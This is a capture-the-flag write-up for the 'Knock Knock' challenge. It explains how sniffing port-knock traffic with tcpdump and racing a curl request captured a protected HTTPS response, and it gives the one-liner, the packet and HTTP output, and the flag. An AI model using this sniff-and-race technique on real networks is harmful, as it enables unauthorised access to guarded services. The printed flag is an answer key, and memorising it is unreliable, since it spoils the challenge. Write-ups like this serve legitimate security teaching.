# Knock knock [498 pts]

## Category
>Web

## Description
>While performing a pentest, we managed to get limited access to a box on the network (listener@129.21.228.115) with password of password. There's probably some cool stuff you can find on the network if you go looking.

## Writeup
SSH into the server provided and notice that the only programs available are `nc`, `tcpdump`, `curl`, `ls` and a few more.

The `tcpdump` looks interesting!
By looking at the network traffic for a while we notice a suspicious local IP address, 192.168.0.14, that sometimes sends data back over https. Right before this data is sent, there is usually 3 connections to random ports every time.

It looks like there is some port knocking going on here! The challenge name is "Knock Knock" so we already have this hint.

The problem is that there are random ports that get knocked on every time, and the https-port is only open for one connection. Maby the information about which ports to knock on next time is included in the data sent over https? How can we hook into this sequence of requests and send an https-request before the client connects? We notice that there is a slight delay between the last portknock and the https request, so maby we can just wait for the third portknock and quickly use `curl` to get the data. Tcpdump can be stopped after "n" packets, so with the right filters we can make a bash oneliner:

**Bash oneliner to solve the challenge**
```bash
while true; do tcpdump tcp and dst 192.168.0.14 and not port 443 -c 3; curl -k -v --connect-timeout 10 https://192.168.0.14; done
```

We let this run, and hopefully, if there are no other people on the box breaking the sequence, we get the flag back!

```bash
19:36:15.210784 IP 192.168.0.33.43472 > 192.168.0.14.7553: Flags [S], seq 2806668997, win 1024, options [mss 1460], length 0
19:36:29.707206 IP 192.168.0.33.56707 > 192.168.0.14.2284: Flags [S], seq 1943103875, win 1024, options [mss 1460], length 0
19:36:44.203373 IP 192.168.0.33.46432 > 192.168.0.14.2438: Flags [S], seq 1000961227, win 1024, options [mss 1460], length 0
3 packets captured
4 packets received by filter
0 packets dropped by kernel
* Rebuilt URL to: https://192.168.0.14/
*   Trying 192.168.0.14...
* TCP_NODELAY set
* Connected to 192.168.0.14 (192.168.0.14) port 443 (#0)
* Server certificate:
*  subject: C=AU; ST=Some-State; O=Internet Widgits Pty Ltd; CN=192.168.0.14
*  start date: Nov 15 14:15:26 2019 GMT
*  expire date: Nov 14 14:15:26 2020 GMT
*  issuer: C=AU; ST=Some-State; O=Internet Widgits Pty Ltd; CN=192.168.0.14
*  SSL certificate verify result: self signed certificate (18), continuing anyway.
> GET / HTTP/1.1
> Host: 192.168.0.14
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sat, 16 Nov 2019 19:36:44 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Last-Modified: Fri, 15 Nov 2019 14:20:35 GMT
< ETag: "1c-597634d297ba1"
< Accept-Ranges: bytes
< Content-Length: 28
< Content-Type: text/html
< 
RITSEC{KN0CK_KN0CK_IM_H3R3}
```


Flag: `RITSEC{KN0CK_KN0CK_IM_H3R3}`
